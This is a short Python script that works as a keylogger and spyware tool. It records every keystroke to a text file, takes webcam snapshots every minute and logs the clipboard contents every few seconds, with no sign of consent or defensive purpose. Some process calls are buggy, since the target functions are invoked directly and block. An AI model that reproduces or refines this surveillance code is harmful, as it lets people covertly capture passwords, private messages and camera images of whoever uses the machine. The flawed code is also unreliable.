import time
from datetime import datetime
from multiprocessing import Process

import cv2
import pyperclip
from pynput import keyboard


def key_press(key):
    print(str(key))
    with open(file_path, 'a', encoding='utf-8') as f:
        try:
            if key == keyboard.Key.enter:
                f.write('\n')
            elif key == keyboard.Key.space:
                f.write(' ')
            elif key == keyboard.Key.tab:
                f.write('\t')
            elif key == keyboard.Key.backspace:
                pass
            else:
                char = key.char
                f.write(char)
        except AttributeError:
            print('Error while getting char')


def webcam_screenshot(filepath):
    global dt_string
    while True:
        with open(file_path, 'a', encoding='utf-8') as f:
            f.write(f'\nScreenshot taken on:\n{dt_string}\n')
            f.close()
        cap = cv2.VideoCapture(0)

        if not cap.isOpened():
            print("Error")
            return
        ret, frame = cap.read()
        if not ret:
            print("Error")
            return

        cv2.imwrite('screenshot.jpg', frame)
        cap.release()
        time.sleep(60)


def clipboard_copy():
    global dt_string
    while True:
        clipboard_data = pyperclip.paste()
        with open(file_path, 'a', encoding='utf-8') as f:
            try:                
                f.write(f'\nClipboard Data on {dt_string}\n{clipboard_data}\n')
            except:
                f.write('Error')
        time.sleep(5)
        print(clipboard_data)


if __name__ == '__main__':
    now = datetime.now()
    dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
    while True:
        file_path = r'text.txt'
        listener = keyboard.Listener(on_press=key_press)
        listener.start()
        p1 = Process(target=webcam_screenshot(file_path))
        p1.start()
        p2 = Process(target=clipboard_copy())
        p2.start()



